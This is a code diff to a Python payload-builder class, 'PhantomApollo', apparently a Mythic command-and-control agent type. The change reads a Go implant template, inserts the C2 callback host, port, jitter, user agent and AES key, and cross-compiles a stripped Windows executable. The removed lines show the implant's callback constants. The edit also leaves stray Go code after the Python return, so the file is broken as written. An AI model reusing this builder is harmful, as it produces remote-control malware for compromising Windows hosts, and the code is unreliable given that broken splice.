@@ -87,51 +87,68 @@ class PhantomApollo(PayloadType):
         protocol = "https" if use_ssl else "http"
         callback_url = f"{protocol}://{callback_host}:{callback_port}"
         
-        # Build the Go source with embedded parameters
-        go_source = f'''package main
-
-import (
-    "bytes"
-    "crypto/aes"
-    "crypto/cipher"
-    "crypto/rand"
-    "crypto/tls"
-    "encoding/base64"
-    "encoding/json"
-    "fmt"
-    "io"
-    "math/rand"
-    "net/http"
-    "os"
-    "os/exec"
-    "os/user"
-    "runtime"
-    "strconv"
-    "strings"
-    "sync"
-    "syscall"
-    "time"
-    "unsafe"
-)
-
-const (
-    MYTHIC_URL = "{callback_url}/graphql/"
-    CALLBACK_HOST = "{callback_host}"
-    CALLBACK_PORT = "{callback_port}"
-    CALLBACK_INTERVAL = {callback_interval}
-    CALLBACK_JITTER = {callback_jitter}
-    USER_AGENT = "{user_agent}"
-    DEBUG_MODE = {str(debug).lower()}
-    USE_SSL = {str(use_ssl).lower()}
-    AES_PSK = "{aes_psk}"
-)
-
-var (
-    processedTasks = make(map[string]bool)
-    currentDir     = ""
-    callbackID     = ""
-    taskMutex      sync.Mutex
-)
+        # Read the Go agent template
+        with open("agent_code/phantom_agent.go", "r") as f:
+            go_template = f.read()
+        
+        # Replace template variables with build parameters
+        go_source = go_template.replace("{{.callback_host}}", callback_host)
+        go_source = go_source.replace("{{.callback_port}}", str(callback_port))
+        go_source = go_source.replace("{{.callback_interval}}", str(callback_interval))
+        go_source = go_source.replace("{{.callback_jitter}}", str(callback_jitter))
+        go_source = go_source.replace("{{.use_ssl}}", "true" if use_ssl else "false")
+        go_source = go_source.replace("{{.user_agent}}", user_agent)
+        go_source = go_source.replace("{{.aes_psk}}", aes_psk)
+        go_source = go_source.replace("{{.debug}}", "true" if debug else "false")
+        
+        # Write the customized source code
+        with open("phantom_agent_build.go", "w") as f:
+            f.write(go_source)
+        
+        try:
+            # Determine target architecture
+            target_arch = "amd64"  # Default to 64-bit
+            if "x32" in self.uuid or "386" in self.uuid:
+                target_arch = "386"
+            
+            # Build the Go executable
+            build_cmd = [
+                "go", "build",
+                "-ldflags", "-s -w",
+                "-o", f"phantom_apollo_{target_arch}.exe",
+                "phantom_agent_build.go"
+            ]
+            
+            # Set environment variables for cross-compilation
+            env = os.environ.copy()
+            env["GOOS"] = "windows"
+            env["GOARCH"] = target_arch
+            env["CGO_ENABLED"] = "0"
+            
+            # Execute build command
+            result = subprocess.run(build_cmd, env=env, capture_output=True, text=True)
+            
+            if result.returncode != 0:
+                resp.build_stderr = f"Build failed: {result.stderr}"
+                resp.status = BuildStatus.Error
+                return resp
+            
+            # Read the compiled executable
+            exe_path = f"phantom_apollo_{target_arch}.exe"
+            with open(exe_path, "rb") as f:
+                resp.payload = base64.b64encode(f.read()).decode()
+            
+            resp.build_message = f"Successfully built Phantom Apollo for Windows {target_arch}"
+            
+            # Clean up temporary files
+            os.remove("phantom_agent_build.go")
+            os.remove(exe_path)
+            
+        except Exception as e:
+            resp.build_stderr = f"Build error: {str(e)}"
+            resp.status = BuildStatus.Error
+        
+        return resp
 
 type GraphQLRequest struct {{
     Query     string                 `json:"query"`
